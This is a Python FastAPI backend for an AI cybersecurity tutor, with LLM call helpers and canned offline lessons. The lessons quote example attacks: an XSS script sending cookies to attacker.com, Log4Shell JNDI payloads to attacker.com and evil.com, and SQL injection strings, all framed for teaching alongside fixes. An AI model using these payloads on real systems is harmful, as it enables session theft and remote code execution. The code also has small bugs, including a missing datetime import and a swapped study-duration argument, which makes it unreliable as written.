import os
import json
import urllib.request
import urllib.parse
from fastapi import APIRouter, HTTPException, Header, Request
from pydantic import BaseModel
from typing import List, Dict, Optional
from backend.natasha_engine import answer_academic_query

router = APIRouter()

# Helper function to call the Google Gemini API using native libraries
def call_gemini_api(prompt: str, system_instruction: Optional[str] = None, api_key: Optional[str] = None) -> str:
    resolved_key = api_key or os.getenv("GEMINI_API_KEY")
    if not resolved_key:
        raise ValueError("API Key is missing.")
        
    resolved_key = resolved_key.strip()
    if not resolved_key or resolved_key.lower() in ["null", "undefined", "none"]:
        raise ValueError("API Key is placeholder or empty.")

    url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={resolved_key}"
    
    contents = [{
        "role": "user",
        "parts": [{"text": prompt}]
    }]
    
    body = {
        "contents": contents,
        "generationConfig": {
            "temperature": 0.7,
            "topP": 0.95,
            "maxOutputTokens": 2048
        }
    }
    
    if system_instruction:
        body["systemInstruction"] = {
            "parts": [{"text": system_instruction}]
        }
        
    req = urllib.request.Request(
        url,
        data=json.dumps(body).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    with urllib.request.urlopen(req, timeout=12) as response:
        res_data = json.loads(response.read().decode("utf-8"))
        text = res_data["candidates"][0]["content"]["parts"][0]["text"]
        return text

def call_free_llm(prompt: str, system_instruction: Optional[str] = None) -> str:
    system_prompt = system_instruction or (
        "You are Natasha, a friendly and experienced AI Cybersecurity Tutor. "
        "Teach cybersecurity concepts clearly, or answer general knowledge questions perfectly. "
        "Answer in a structured format using markdown."
    )
    
    # Try LLM7 first
    try:
        url = "https://api.llm7.io/v1/chat/completions"
        body = {
            "model": "default",
            "messages": [
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": prompt}
            ]
        }
        req = urllib.request.Request(
            url,
            data=json.dumps(body).encode("utf-8"),
            headers={
                "Content-Type": "application/json",
                "Authorization": "Bearer unused"
            },
            method="POST"
        )
        with urllib.request.urlopen(req, timeout=25) as response:
            res_data = json.loads(response.read().decode("utf-8"))
            return res_data["choices"][0]["message"]["content"].strip()
    except Exception as e:
        print(f"[LLM7 ERROR] falling back to secondary free LLM: {e}")
        
    # Secondary fallback to Pollinations
    try:
        encoded_text = urllib.parse.quote(f"System: {system_prompt}\nUser: {prompt}")
        api_url = f"https://text.pollinations.ai/{encoded_text}"
        req = urllib.request.Request(api_url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=15) as response:
            return response.read().decode("utf-8").strip()
    except Exception as e:
        print(f"[POLLINATIONS ERROR]: {e}")
        raise e

def query_llm(prompt: str, system_instruction: Optional[str] = None, api_key: Optional[str] = None) -> str:
    resolved_key = api_key or os.getenv("GEMINI_API_KEY")
    is_valid_key = (
        resolved_key and 
        resolved_key.strip() and 
        resolved_key.lower() not in ["null", "undefined", "none", ""] and
        not resolved_key.startswith("test-key-") and
        resolved_key != "placeholder"
    )
    if is_valid_key:
        try:
            return call_gemini_api(prompt, system_instruction, resolved_key)
        except Exception as e:
            print(f"[GEMINI ERROR] falling back to free LLM: {e}")
            
    try:
        return call_free_llm(prompt, system_instruction)
    except Exception as e:
        print(f"[FREE LLM ERROR]: {e}")
        raise e

# ================= SIMULATION MODE FALLBACKS =================
# These methods return realistic, high-quality responses when no API Key is available.

def simulate_tutor(message: str) -> str:
    msg_lower = message.lower()
    if "sql injection" in msg_lower or "sqli" in msg_lower:
        return """### 🤖 AI Security Tutor: SQL Injection (SQLi)

**Definition:** SQL Injection occurs when malicious SQL statements are inserted into entry fields for execution (e.g. web form inputs).

**How it Works:** 
An application fails to sanitize inputs, allowing an attacker to manipulate queries sent to the database. For example:
`SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...'`
Since `'1'='1'` is always true, the database bypasses credentials verification and returns the admin profile.

**Real-world Example:** 
In 2014, a major retail company suffered a breach where attackers exploited a SQLi vulnerability in a web application to steal millions of customer credit card numbers.

**Best Practices:**
1. **Prepared Statements (Parameterized Queries):** Treat parameters as data, not executable code.
2. **Input Validation & Sanitization:** Use strict allow-lists for inputs.
3. **Least Privilege:** Ensure the web server database account only has permissions to read/write specific tables, never administrative rights (`DROP`, `ALTER`)."""
    
    elif "xss" in msg_lower or "cross site scripting" in msg_lower:
        return """### 🤖 AI Security Tutor: Cross-Site Scripting (XSS)

**Definition:** XSS allows attackers to inject client-side scripts (usually JavaScript) into web pages viewed by other users.

**Types:**
- **Stored XSS:** The script is permanently stored on the target server (e.g. in a comment field).
- **Reflected XSS:** The script is bounced off the web server in response to a request (e.g. in a search query parameter).
- **DOM-based XSS:** The vulnerability exists in client-side script rather than server-side code.

**Real-world Example:**
An attacker posts a comment containing `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>`. Every user who visits the post will run this script, leaking their session cookies to the attacker.

**Best Practices:**
1. **Context-Aware Output Encoding:** Escape symbols like `<`, `>`, `&`, `"`, `'` before rendering user content.
2. **Content Security Policy (CSP):** Configure HTTP headers restricting script sources.
3. **Use HttpOnly Cookies:** Prevent client-side script access to session tokens."""

    else:
        return f"""### 🤖 AI Security Tutor (Simulation Mode)

Thank you for your question: *"{message}"*.

I am currently running in **Simulation Mode** to prevent errors.

#### 💡 Let's Learn Cybersecurity:
- **Confidentiality, Integrity, Availability (CIA Triad):** The core guiding model for security policies.
- **Firewalls & IDS/IPS:** Tools used to filter and monitor network traffic anomalies.
- **Phishing Audits:** Recognizing spoofed mail headers and suspicious URLs.

**🛠️ To connect to live Gemini LLM:**
Click the **Settings** cog wheel in the dashboard or chat panel, enter your API key, and save settings.
*(You can query specifically about "SQL Injection" or "XSS" to see custom simulated lessons!)*"""


def simulate_explain_command(command: str) -> str:
    cmd_parts = command.strip().split()
    base_cmd = cmd_parts[0] if cmd_parts else ""
    
    if "nmap" in base_cmd.lower():
        return f"""### 🔍 Command Breakdown: `{command}`

This command launches the **Nmap Network Mapper** utility.

* **Tool:** `nmap` (Network discovery and vulnerability auditing tool)
* **Component-by-Component Analysis:**
  - `-sS` (TCP SYN Scan): A semi-open scanning technique. It sends a SYN packet and waits for a response. It does not complete the 3-way handshake, making it relatively stealthy.
  - `-A` (Aggressive scan options): Enables OS detection, version detection, script scanning, and traceroute.
  - `-T4` (Timing Template): Set to "Aggressive" speed to accelerate scanning on stable networks.

**⚠️ Security Implications:**
Port scanning without authorization is often classified as malicious reconnaissance. Always scan targets you own or have explicit permission to test."""

    elif "find" in base_cmd.lower() and "perm" in command:
        return f"""### 🔍 Command Breakdown: `{command}`

This command is scanning the file system to locate files with active **SUID (Set Owner User ID)** permissions.

* **Tool:** `find` (Standard Unix search command)
* **Component-by-Component Analysis:**
  - `/`: Starts search from the root directory.
  - `-perm -4000`: Filters search results to find files with SUID bit set. When SUID is enabled, standard users execute this binary with root privilege.
  - `-type f`: Restricts search strictly to files.
  - `2>/dev/null`: Silences error logs (such as permission denied notices) by redirecting stderr.

**⚠️ Security Implications:**
Frequently used during Linux Privilege Escalation stages to find misconfigured binaries (e.g. SUID shell escapes) that allow regular users to gain root permissions."""

    else:
        return f"""### 🔍 Command Breakdown: `{command}` (Simulation Mode)

I parsed your command base as: **`{base_cmd}`**

* **Syntax Structure:** Valid shell format detected.
* **Analysis:** Since you are in Simulation Mode, I don't have active LLM parameters to parse complex custom arguments.

**🛠️ To see real command explanations:**
Enter a Gemini API Key in the **Settings** menu. Common commands like `nmap` or `find SUID` have custom offline breakdowns!"""


def simulate_explain_log(log: str) -> str:
    if "union" in log.lower() or "select" in log.lower():
        return """### 📋 Log Analysis: SQL Injection Attack Detected

**Log Input:**
`"GET /products.php?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users HTTP/1.1" 200 4501`

**Analysis Breakdown:**
1. **Event:** Web access log entries show SQL Injection syntax.
2. **Indicators:** The string `%20UNION%20SELECT%20` is an attempt to concatenate custom queries to extract usernames and passwords from the database.
3. **Attack Classification:** **High Risk** (Database Exfiltration attempt).
4. **Target URL:** `/products.php` (vulnerable input parameter: `id`).

**🛡️ Action Items:**
- Immediately implement parameterized query checks on the backend for `products.php`.
- Check database server access logs to see if the query returned rows (evident by the `200 OK` status and `4501` bytes response payload)."""

    elif "failed password" in log.lower() or "invalid user" in log.lower():
        return """### 📋 Log Analysis: SSH Brute Force Attempt

**Log Input:**
`"Failed password for invalid user admin from 192.168.1.105 port 54823 ssh2"`

**Analysis Breakdown:**
1. **Event:** Failed SSH login attempt for username `admin`.
2. **Source IP:** `192.168.1.105` (Internal network attacker).
3. **Indicators:** Attempted login to a non-existent or administrative user account via SSH on port `22`.
4. **Attack Classification:** **Medium Risk** (Reconnaissance or Brute Force).

**🛡️ Action Items:**
- Install and configure **Fail2ban** to automatically block IPs with multiple login failures.
- Disable direct root/admin logins over SSH. Enforce SSH key authentication."""

    else:
        return """### 📋 Log Analysis (Simulation Mode)

**Analysis Status:**
No matches for common attack log structures were detected.

**🛠️ Live AI Activation:**
Save a Google Gemini API Key in the settings drawer to run real-time threat auditing on your custom logs."""


def simulate_explain_vuln(vulnerability: str, impact: str) -> str:
    vuln_clean = vulnerability.lower().strip()
    if "log4shell" in vuln_clean or "cve-2021-44228" in vuln_clean:
        return """### 💀 Vulnerability Deep Dive: Log4Shell (CVE-2021-44228)

* **Impact Level:** Critical (CVSS 10.0)
* **Type:** Remote Code Execution (RCE)

**Exploit Mechanics:**
Log4j (a Java logging library) supports JNDI (Java Naming and Directory Interface) lookups. When logging a string containing a format like `${jndi:ldap://attacker.com/a}`, Log4j queries the LDAP server and executes the returned Java class on the host machine.

**Exploit Walkthrough:**
1. Attacker sends payload in HTTP header (e.g. `User-Agent: ${jndi:ldap://evil.com/x}`).
2. Vulnerable application logs the user agent string.
3. Log4j parses the JNDI lookup, connecting to `evil.com`.
4. Attacker server returns a malicious Java object, causing remote execution.

**Remediation:**
- Upgrade Log4j to version `2.17.1` or higher.
- Set environment property `log4j2.formatMsgNoLookups=true`."""

    else:
        return f"""### 💀 Vulnerability Analysis: {vulnerability}

* **Impact Level:** {impact}
* **Simulation Status:** Fallback mode enabled.

**Vulnerability Concept:**
This vulnerability represents a security weakness where system safeguards can be bypassed.

**🛡️ Mitigations:**
- Apply software vendor security updates promptly.
- Ensure proper input bounds checks.

*Enter a Gemini API Key to fetch live security details for "{vulnerability}".*"""


def simulate_ctf_hint(title: str, category: str, hint_tier: int) -> str:
    if hint_tier == 1:
        return f"""### 🚩 CTF Hint Tier 1: General Guidance
**Challenge:** "{title}" ({category})

* **Hint:** Look at the transport protocols and response headers. Try auditing what information the server leaks during normal request/response flows. Look for custom headers like `X-Developer-Note` or cookie parameter names."""
    elif hint_tier == 2:
        return f"""### 🚩 CTF Hint Tier 2: Technical Approach
**Challenge:** "{title}" ({category})

* **Hint:** The application uses Base64 or Hex encodings to store session values. Decode the cookie value you captured in your web proxy tool (e.g. Burp Suite) and inspect if it matches a JSON dictionary structure."""
    else:
        return f"""### 🚩 CTF Hint Tier 3: Command & Syntax
**Challenge:** "{title}" ({category})

* **Hint:** Use `cyberchef` or a python script to modify the decrypted session cookie. Set the key `"is_admin": true` or `"role": "admin"`, re-encode it, replace your active cookie parameter, and refresh the dashboard portal page."""


def simulate_security_report(target: str, title: str, severity: str) -> str:
    return f"""# 📝 VULNERABILITY AUDIT REPORT

**Target:** {target}
**Date:** {datetime.now().strftime("%Y-%m-%d")}
**Severity:** {severity.upper()}

---

## 1. Executive Summary
During a security audit of **{target}**, a vulnerability identified as **{title}** was discovered. This vulnerability presents a **{severity}** risk to the organization's network integrity.

## 2. Technical Findings
The vulnerability lies in input entry fields. Standard bounds validations are absent, allowing inputs to trigger unexpected backend behaviors.

## 3. Risk Assessment
* **Confidentiality:** Potential access to customer metadata.
* **Integrity:** Unauthorized modifications could occur.
* **Availability:** Low service disruption potential.

## 4. Remediation Plan
1. **Apply Input Sanitation:** Filter symbols and limit string lengths.
2. **Configure WAF Rules:** Block strings matching patterns.
3. **Conduct Retest:** Validate patch correctness.

---
*Generated by AIGRA Security Report Generator (Simulation Mode)*"""


def simulate_attack_scenario(target_profile: str, industry: str) -> str:
    return f"""### ⚔️ Red-Team Threat Scenario: {industry} Audit

**Target System Profile:** {target_profile}
**Context:** {industry} compliance network.

---

#### Step 1: Reconnaissance (Information Gathering)
* Attackers query OSINT assets to find public email accounts and active domain registry maps.
* Run passive subdomain audits to discover staging applications.

#### Step 2: Initial Compromise
* Launch focused phishing emails targets (spear-phishing) with attachments carrying macros, or exploit vulnerable web interfaces found during staging.

#### Step 3: Lateral Movement
* Attackers dump cached credentials on memory buffers and scan internal subnets for outdated server installations (e.g., active SUID tools, weak SSH logins).

#### Step 4: Objective / Data Exfiltration
* Access SQL data logs or file stores, package them into password-protected archives, and upload via port `443` disguised as HTTPS traffic to evade alerts.

---
*Generated by AIGRA Attack Scenario Engine (Simulation Mode)*"""


def simulate_study_assistant(topic: str, duration: str) -> str:
    return f"""### 📚 Study Guide: {topic} ({duration} Prep)

#### 1. Study Timeline Outline
* **Phase 1 (Concepts):** Learn the core definitions, structures, and common terms.
* **Phase 2 (Hands-on):** Set up local sandbox servers to inspect exploits in action.
* **Phase 3 (Review):** Complete quiz questions to verify understanding.

#### 2. Interactive Study Flashcards
* **Flashcard 1:**
  * **Q:** What is the difference between encryption and hashing?
  * **A:** Encryption is two-way (decryption is possible), whereas hashing is one-way (irreversible).
* **Flashcard 3:**
  * **Q:** What port does HTTPS run on?
  * **A:** TCP Port `443` (HTTP runs on Port `80`).

#### 3. Practice Assessment Quiz
1. Which security principle ensures that only authorized entities view sensitive data?
   - A) Integrity
   - B) Confidentiality
   - C) Availability
   *Answer: B (Confidentiality)*

---
*Generated by AIGRA Study Assistant (Simulation Mode)*"""

# ================= REQUEST MODELS & ROUTERS =================

class AskRequest(BaseModel):
    prompt: Optional[str] = None
    message: Optional[str] = None
    history: Optional[List[Dict[str, str]]] = []
    api_key: Optional[str] = None

class TutorRequest(BaseModel):
    message: str
    history: Optional[List[Dict[str, str]]] = []
    api_key: Optional[str] = None

class CommandRequest(BaseModel):
    command: str
    shell: str
    api_key: Optional[str] = None

class LogRequest(BaseModel):
    log: str
    format: str
    api_key: Optional[str] = None

class VulnRequest(BaseModel):
    vulnerability: str
    impact: str
    api_key: Optional[str] = None

class CtfRequest(BaseModel):
    title: str
    category: str
    description: str
    attempted: str
    hint_tier: int
    api_key: Optional[str] = None

class ReportRequest(BaseModel):
    target: str
    title: str
    severity: str
    description: str
    remediation: str
    api_key: Optional[str] = None

class AttackRequest(BaseModel):
    target_profile: str
    industry: str
    compliance: str
    api_key: Optional[str] = None

class StudyRequest(BaseModel):
    topic: str
    duration: str
    api_key: Optional[str] = None


@router.post("/api/ai/ask")
async def ai_ask(req: AskRequest):
    query_text = (req.prompt or req.message or "").strip()
    reply, mode = answer_academic_query(query_text, req.history, req.api_key)
    return {
        "status": "success",
        "reply": reply,
        "response": reply,
        "result": reply,
        "mode": mode
    }


@router.post("/api/ai/tutor")
async def ai_tutor(req: TutorRequest):
    reply, mode = answer_academic_query(req.message, req.history, req.api_key)
    return {
        "status": "success",
        "result": reply,
        "reply": reply,
        "response": reply,
        "mode": mode
    }


@router.post("/api/ai/explain_command")
async def ai_explain_command(req: CommandRequest):
    prompt = (
        f"Please explain this shell command (Shell type: {req.shell}):\n"
        f"`{req.command}`\n\n"
        "Provide: \n"
        "1. Overall purpose of the command.\n"
        "2. Detailed component-by-component syntax analysis (explain flags, parameters, operators).\n"
        "3. Security/ethical implications (is it used for system triage, pen-testing, or reconnaissance? "
        "Are there risks running it?)."
    )
    try:
        res = query_llm(prompt, "You are a professional command interpreter security auditor.", req.api_key)
        return {"result": res, "mode": "live"}
    except Exception as e:
        print(f"[API ERROR] Command Explainer error (falling back to simulation): {e}")
        sim_res = simulate_explain_command(req.command)
        return {"result": sim_res, "mode": "simulation"}


@router.post("/api/ai/explain_log")
async def ai_explain_log(req: LogRequest):
    prompt = (
        f"Analyze the following log entry (Format: {req.format}):\n"
        f"\"\"\"\n{req.log}\n\"\"\"\n\n"
        "Deliver a threat audit detailing:\n"
        "1. Event Summary (what happened?)\n"
        "2. Identifiers & Sources (IP address, usernames, timestamps)\n"
        "3. Threat Level Assessment (Low, Medium, High, Critical) with technical justification\n"
        "4. Recommendations & Mitigation Steps."
    )
    try:
        res = query_llm(prompt, "You are an expert Security Operations Center (SOC) Log Analyst.", req.api_key)
        return {"result": res, "mode": "live"}
    except Exception as e:
        print(f"[API ERROR] Log Explainer error (falling back to simulation): {e}")
        sim_res = simulate_explain_log(req.log)
        return {"result": sim_res, "mode": "simulation"}


@router.post("/api/ai/explain_vuln")
async def ai_explain_vuln(req: VulnRequest):
    prompt = (
        f"Provide a vulnerability briefing for: \"{req.vulnerability}\".\n"
        f"Target Impact: {req.impact}\n\n"
        "Cover the following sections:\n"
        "1. Vulnerability description (What is it, CVE ID if applicable)\n"
        "2. Exploit Vector (How is it typically executed by threat actors?)\n"
        "3. Technical Impact (e.g. data breach, lateral movement, service crashes)\n"
        "4. Specific Patching & Remediation steps (How do sysadmins fix it?)."
    )
    try:
        res = query_llm(prompt, "You are a vulnerability research expert.", req.api_key)
        return {"result": res, "mode": "live"}
    except Exception as e:
        print(f"[API ERROR] Vuln Explainer error (falling back to simulation): {e}")
        sim_res = simulate_explain_vuln(req.vulnerability, req.impact)
        return {"result": sim_res, "mode": "simulation"}


@router.post("/api/ai/ctf_hint")
async def ai_ctf_hint(req: CtfRequest):
    prompt = (
        f"Generate Hint Tier {req.hint_tier} (out of 3) for the following CTF challenge:\n"
        f"Title: \"{req.title}\"\n"
        f"Category: {req.category}\n"
        f"Description: {req.description}\n"
        f"What the user already tried: {req.attempted}\n\n"
        "CRITICAL RULES:\n"
        "- DO NOT give the flag under any circumstances.\n"
        "- Keep the hint progressive. Tier 1 is general guidance, Tier 2 is technical direction, Tier 3 is syntactical/tool recommendations.\n"
        "- Encourage the user's logic."
    )
    try:
        res = query_llm(prompt, "You are a helpful CTF designer mentor.", req.api_key)
        return {"result": res, "mode": "live"}
    except Exception as e:
        print(f"[API ERROR] CTF Hint error (falling back to simulation): {e}")
        sim_res = simulate_ctf_hint(req.title, req.category, req.hint_tier)
        return {"result": sim_res, "mode": "simulation"}


@router.post("/api/ai/report_generator")
async def ai_report_generator(req: ReportRequest):
    prompt = (
        f"Generate a professional vulnerability audit report based on these parameters:\n"
        f"Target Asset: {req.target}\n"
        f"Finding Title: {req.title}\n"
        f"Severity: {req.severity}\n"
        f"Description: {req.description}\n"
        f"Remediation: {req.remediation}\n\n"
        "Format the output as a clean, corporate audit report containing:\n"
        "- Executive Summary\n"
        "- Technical Vulnerability Analysis\n"
        "- Severity Risk Assessment Matrix\n"
        "- Detailed Mitigation Checklist."
    )
    try:
        res = query_llm(prompt, "You are an expert Security Audit Consultant.", req.api_key)
        return {"result": res, "mode": "live"}
    except Exception as e:
        print(f"[API ERROR] Report Generator error (falling back to simulation): {e}")
        sim_res = simulate_security_report(req.target, req.title, req.severity)
        return {"result": sim_res, "mode": "simulation"}


@router.post("/api/ai/attack_scenario")
async def ai_attack_scenario(req: AttackRequest):
    prompt = (
        f"Generate a simulated threat modeling attack scenario:\n"
        f"Target Host/Profile: {req.target_profile}\n"
        f"Target Industry: {req.industry}\n"
        f"Compliance Framework: {req.compliance}\n\n"
        "Map out a multi-phase penetration testing red-team scenario:\n"
        "1. Reconnaissance phase.\n"
        "2. Initial Compromise.\n"
        "3. Privilege Escalation & Lateral Movement.\n"
        "4. Objective / Data exfiltration.\n"
        "Include defensive recommendations to counter each step."
    )
    try:
        res = query_llm(prompt, "You are a Red Team Adversary Simulation Lead.", req.api_key)
        return {"result": res, "mode": "live"}
    except Exception as e:
        print(f"[API ERROR] Attack Scenario error (falling back to simulation): {e}")
        sim_res = simulate_attack_scenario(req.target_profile, req.industry)
        return {"result": sim_res, "mode": "simulation"}


@router.post("/api/ai/study_assistant")
async def ai_study_assistant(req: StudyRequest):
    prompt = (
        f"Construct a structured study package for topic: \"{req.topic}\"\n"
        f"Target preparation timeline: {req.duration}\n\n"
        "Generate:\n"
        "1. Study Timeline (Phase-by-phase recommendation)\n"
        "2. 5 interactive flashcards in format Q: [question] / A: [answer]\n"
        "3. 3 Practice Multiple-Choice questions (with answers and brief explanations)."
    )
    try:
        res = query_llm(prompt, "You are a cybersecurity certifications mentor.", req.api_key)
        return {"result": res, "mode": "live"}
    except Exception as e:
        print(f"[API ERROR] Study Assistant error (falling back to simulation): {e}")
        sim_res = simulate_study_assistant(req.topic, req.topic)
        return {"result": sim_res, "mode": "simulation"}
